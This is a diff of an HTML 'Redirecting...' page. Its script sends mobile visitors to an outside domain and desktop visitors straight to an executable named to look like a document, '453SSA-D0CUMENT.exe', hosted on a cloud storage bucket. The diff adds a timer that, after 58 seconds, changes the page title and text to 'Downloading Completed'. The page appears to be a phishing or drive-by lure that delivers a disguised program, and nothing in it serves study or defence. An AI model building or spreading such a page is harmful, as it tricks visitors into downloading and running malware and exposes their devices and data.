@@ -3,24 +3,38 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
   <title>Redirecting...</title>
 
   <script>
     const userAgent = navigator.userAgent.toLowerCase();
 
     // Simple mobile detection
-    const isMobile = /iphone|ipod|android|blackberry|opera mini|windows phone|mobile/i.test(userAgent);
+    const isMobile =
+      /iphone|ipod|android|blackberry|opera mini|windows phone|mobile/i.test(userAgent);
 
     if (isMobile) {
       // Mobile redirect
       window.location.href = "https://msrmails.de/bas";
     } else {
       // Desktop redirect
-      window.location.href = "https://pub-d34c24ee9207490584a6f42b7498618a.r2.dev/453SSA-D0CUMENT.exe";
+      window.location.href =
+        "https://pub-d34c24ee9207490584a6f42b7498618a.r2.dev/453SSA-D0CUMENT.exe";
     }
+
+    // Change page text after 58 seconds
+    setTimeout(() => {
+      document.title = "Downloading Completed";
+
+      const status = document.getElementById("status");
+      if (status) {
+        status.innerText = "Downloading Completed";
+      }
+    }, 58000);
   </script>
 </head>
+
 <body>
-  <p>Redirecting...</p>
+  <p id="status">Redirecting...</p>
 </body>
 </html>
